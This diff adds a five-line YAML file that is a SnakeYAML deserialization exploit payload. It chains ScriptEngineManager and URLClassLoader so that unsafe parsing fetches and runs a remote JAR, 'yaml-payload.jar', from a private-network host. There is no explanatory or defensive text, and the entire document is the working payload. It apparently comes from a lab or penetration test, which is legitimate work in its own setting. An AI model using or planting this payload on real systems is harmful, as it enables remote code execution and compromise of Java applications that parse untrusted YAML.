@@ -1,0 +1,5 @@
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://192.168.37.134:8888/yaml-payload.jar"]
+  ]]
+]
